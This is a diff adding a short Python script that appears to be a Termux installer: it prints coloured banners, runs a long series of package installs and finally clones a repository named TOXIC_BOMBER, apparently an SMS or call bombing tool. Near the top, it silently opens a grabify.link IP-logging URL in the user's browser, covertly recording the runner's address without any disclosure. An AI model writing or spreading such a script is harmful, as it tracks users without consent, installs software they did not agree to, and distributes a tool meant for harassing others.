@@ -1,0 +1,56 @@
+import requests
+from math import log
+from requests.structures import CaseInsensitiveDict
+import requests,json,os,sys,random,datetime,time,smtplib,colorama
+# Bold High Intensty
+biblack="\033[1;90m"      # Black
+bired="\033[1;91m"        # Red
+bigreen="\033[1;92m"      # Green
+biyellow="\033[1;93m"     # Yellow
+biblue="\033[1;94m"       # Blue
+bipurple="\033[1;95m"     # Purple
+bicyan="\033[1;96m"       # Cyan
+biwhite="\033[1;97m"      # White
+blue = '\033[94m'
+purple = '\033[95m'
+red = '\033[91m'
+white = '\033[97m'
+yellow = '\033[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+os.system('clear')
+os.system("lolcat Love")
+os.system('xdg-open https://grabify.link/SLCVU3')
+time.sleep(5)
+os.system('pkg install python && apt update -y && apt upgrade -y')
+os.system('pkg install cmatrix')
+os.system('clear')
+os.system("pkg install root-repo")
+os.system('pkg install git -y')
+os.system('clear')
+os.system('pip install lolcat')
+os.system('clear')
+os.system('pip2 install lolcat')
+os.system('clear')
+os.system("pkg install php")
+os.system('clear')
+os.system("gem install lolcat")
+os.system('pkg install wget')
+os.system('clear')
+os.system("lolcat Love")
+os.system('pip install futures')
+os.system('clear')
+os.system("pip install bs4")
+os.system('pip install aiohttp')
+os.system('clear')
+os.system("lolcat Love")
+os.system('pip install colorama')
+os.system('clear')
+os.system("lolcat Love")
+os.system('pkg install root-repo')
+os.system('pip install requests')
+os.system("lolcat Love")
+time.sleep(5)
+os.system('clear')
+os.system("lolcat Love")
+os.system('git clone https://github.com/PSYCHO-404/TOXIC_BOMBER')
